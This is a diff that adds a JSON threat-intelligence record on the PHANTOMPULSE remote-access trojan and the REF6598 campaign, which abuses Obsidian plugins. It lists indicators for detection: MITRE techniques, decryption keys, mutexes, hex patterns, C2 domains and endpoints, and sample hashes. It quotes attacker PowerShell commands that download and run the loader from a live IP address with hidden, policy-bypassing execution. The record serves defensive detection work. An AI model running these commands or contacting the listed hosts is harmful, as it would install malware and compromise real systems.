@@ -1,0 +1,455 @@
+{
+  "malware_family": "PHANTOMPULSE",
+  "threat_actor": "REF6598",
+  "platforms": [
+    "windows",
+    "macos"
+  ],
+  "summary": "The REF6598 campaign uses social engineering to abuse the Obsidian note-taking app's plugin system for initial access. The attack deploys PHANTOMPULL, a custom loader, which in turn reflectively loads the PHANTOMPULSE RAT. PHANTOMPULSE is a novel backdoor featuring a unique C2 resolution mechanism via public blockchain transaction data.",
+  "mitre_techniques": [
+    "T1566.003",
+    "T1204.002",
+    "T1059.001",
+    "T1059.002",
+    "T1140",
+    "T1620",
+    "T1497.003",
+    "T1055",
+    "T1053.005",
+    "T1547.011",
+    "T1056.001",
+    "T1113",
+    "T1082",
+    "T1548.002"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "iwr http://195.3.222.251/script1.ps1 -OutFile env:TEMP\\tt.ps1 -UseBasicParsing",
+      "context": "Decoded from Base64 in Shell Commands plugin, parent is powershell.exe",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"env:TEMP\\tt.ps1\"",
+      "context": "Decoded from Base64 in Shell Commands plugin, parent is powershell.exe",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "Start-BitsTransfer -Source 'http://195.3.222.251/syncobs.exe?q=%23OBSIDIAN' `\n  -Destination \"$env:TEMP\\syncobs.exe\"",
+      "context": "Executed by script1.ps1 (tt.ps1) to download PHANTOMPULL loader.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "GFILE FOUND ON PC",
+      "context": "Status message sent to C2 by script1.ps1.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "GLAUNCH SUCCESS",
+      "context": "Status message sent to C2 by script1.ps1.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "GSESSION CLOSED",
+      "context": "Status message sent to C2 by script1.ps1.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "0x4E67C6A7",
+      "context": "PHANTOMPULL djb2 hash seed for API resolution.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "6a85736b64761a8b2aaeadc1c0087e1897d16cc5a9d49c6a6ea1164233bad206",
+      "context": "PHANTOMPULL hardcoded AES-256-CBC key for PE payload decryption.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "A6FA4ADFC20E8E6B77E2DD631DC8FF18",
+      "context": "PHANTOMPULL hardcoded AES-256-CBC IV for PE payload decryption.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "0x0C1DF",
+      "context": "PHANTOMPULL constant XORed with 0x9B92 to validate PE header.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "mutex",
+      "value": "hVNBUORXNiFLhYYh",
+      "context": "PHANTOMPULL second stage mutex.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "f77c8e40dfc17be5e74d8679d5b35341",
+      "context": "PHANTOMPULL 16-byte rotating key for C2/URL string decryption.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "dcf5a9b27cbeedb769ccc8635d204af9",
+      "context": "PHANTOMPULL 16-byte XOR key for final PHANTOMPULSE payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Phantom Panel",
+      "context": "Branding on the publicly exposed C2 login page.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "0xc117688c530b660e15085bF3A2B664117d8672aA",
+      "context": "PHANTOMPULSE hardcoded wallet address for blockchain C2 resolution.",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "inject",
+      "context": "PHANTOMPULSE command to inject shellcode/DLL/EXE.",
+      "specificity": "high",
+      "evidence": "hash_gated",
+      "origin_tool": "",
+      "hash_algo": "djb2",
+      "hash_value": "0x04CF1142"
+    },
+    {
+      "kind": "other",
+      "value": "screenshot",
+      "context": "PHANTOMPULSE command to capture a screenshot.",
+      "specificity": "high",
+      "evidence": "hash_gated",
+      "origin_tool": "",
+      "hash_algo": "djb2",
+      "hash_value": "0x9A37F083"
+    },
+    {
+      "kind": "other",
+      "value": "uninstall",
+      "context": "PHANTOMPULSE command for persistence removal and cleanup.",
+      "specificity": "high",
+      "evidence": "hash_gated",
+      "origin_tool": "",
+      "hash_algo": "djb2",
+      "hash_value": "0x4EE251FF"
+    },
+    {
+      "kind": "file_path",
+      "value": "~/Library/LaunchAgents/com.vfrfeufhtjpwgray.plist",
+      "context": "macOS persistence LaunchAgent plist file path.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "com.vfrfeufhtjpwgray.plist",
+      "context": "macOS persistence LaunchAgent plist file name.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "Obsidian.exe:powershell.exe",
+      "context": "Obsidian spawning powershell to execute malicious commands.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 48 83 C4 80 FF 15 ?? ?? ?? ?? 83 F8 FE 75 }",
+      "context": "PHANTOMPULL unreachable GetTickCount check.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 45 8B 0C 83 41 BA A7 C6 67 4E 49 01 C9 45 8A 01 }",
+      "context": "PHANTOMPULL djb2 hashing routine.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "[UNINSTALL 2/6] Removing Scheduled Task...",
+      "context": "PHANTOMPULSE debug string.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PhantomInject: host PID=%lu",
+      "context": "PHANTOMPULSE debug string.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "inject: shellcode detected -> InjectShellcodePhantom",
+      "context": "PHANTOMPULSE debug string.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "195.3.222.251",
+      "context": "Staging server for PowerShell script & PHANTOMPULL loader.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "panel.fefea22134.net",
+      "context": "PHANTOMPULSE C2 panel domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "thoroughly-publisher-troy-clara.trycloudflare.com",
+      "context": "Prior PHANTOMPULSE C2 via Cloudflare Tunnel.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "0x666.info",
+      "context": "macOS dropper primary C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "t.me/ax03bot",
+      "context": "macOS dropper Telegram fallback C2 for domain retrieval.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/syncobs.exe?q=%23OBSIDIAN",
+      "context": "Path used to download PHANTOMPULL loader.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/stuk-phase",
+      "context": "Endpoint for script1.ps1 to report status messages.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/v1/updates/check?build=payloads",
+      "context": "PHANTOMPULL endpoint to download final payload.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "context": "Hardcoded User-Agent for PHANTOMPULL C2 requests.",
+      "specificity": "low",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api?module=account&action=txlist&address=<wallet>&page=1&offset=1&sort=desc",
+      "context": "PHANTOMPULSE query to Blockscout API for C2 resolution.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "eth.blockscout.com",
+      "context": "Blockchain explorer used for C2 resolution (Ethereum).",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "base.blockscout.com",
+      "context": "Blockchain explorer used for C2 resolution (Base L2).",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "optimism.blockscout.com",
+      "context": "Blockchain explorer used for C2 resolution (Optimism L2).",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/v1/telemetry/report",
+      "context": "PHANTOMPULSE C2 endpoint for heartbeat and telemetry.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/v1/telemetry/tasks/<id>",
+      "context": "PHANTOMPULSE C2 endpoint for command fetching.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/v1/telemetry/upload/",
+      "context": "PHANTOMPULSE C2 endpoint for screenshot/file upload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/v1/telemetry/result",
+      "context": "PHANTOMPULSE C2 endpoint for command result delivery.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/v1/telemetry/keylog/",
+      "context": "PHANTOMPULSE C2 endpoint for keylog data upload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "Obsidian",
+      "context": "Campaign tag sent in status updates to C2.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "70bbb38b70fd836d66e8166ec27be9aa8535b3876596fc80c45e3de4ce327980",
+      "description": "PHANTOMPULL loader (syncobs.exe)"
+    },
+    {
+      "sha256": "33dacf9f854f636216e5062ca252df8e5bed652efd78b86512f5b868b11ee70f",
+      "description": "PhantomPulse RAT (final payload)"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
